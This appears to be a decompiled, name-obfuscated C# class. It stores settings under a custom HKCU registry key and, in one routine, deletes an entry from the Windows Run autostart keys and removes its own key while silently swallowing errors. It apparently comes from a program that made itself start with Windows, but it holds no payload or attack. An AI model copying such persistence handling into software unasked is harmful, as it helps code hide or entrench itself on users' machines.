using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
public sealed class GClass2
{
	public static GClass0 gclass0_0;

	public static string string_0 = "HKEY_CURRENT_USER\\Software\\nKey";

	public static Registry registry_0;

	public static void smethod_0(ref string string_1, ref string string_2)
	{
		Registry.SetValue(string_0, string_1, string_2, RegistryValueKind.String);
	}

	public static string smethod_1(ref string string_1, ref string string_2)
	{
		string text = Conversions.ToString(Registry.GetValue(string_0, string_1, null));
		if (Operators.CompareString(text, (string)null, false) == 0)
		{
			return string_2;
		}
		return text;
	}

	public static void smethod_2(ref string string_1)
	{
		Array array = Strings.Split(string_0, "\\", -1, (CompareMethod)0);
		string name = string_0.Replace(Conversions.ToString(Operators.ConcatenateObject(NewLateBinding.LateIndexGet((object)array, new object[1] { 0 }, (string[])null), (object)"\\")), string.Empty);
		Registry.CurrentUser.OpenSubKey(name, writable: true)!.DeleteValue(string_1);
	}

	public static void smethod_3()
	{
		string string_ = GClass0.string_3;
		GClass0.string_3 = string.Empty;
		if (Operators.CompareString(string_, string.Empty, false) != 0)
		{
			try
			{
				Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(string_);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.DeleteValue(string_);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Array array = Strings.Split(string_0, "\\", -1, (CompareMethod)0);
			Registry.CurrentUser.OpenSubKey("Software", writable: true)!.DeleteSubKey(Conversions.ToString(NewLateBinding.LateIndexGet((object)array, new object[1] { checked(array.Length - 1) }, (string[])null)), throwOnMissingSubKey: false);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
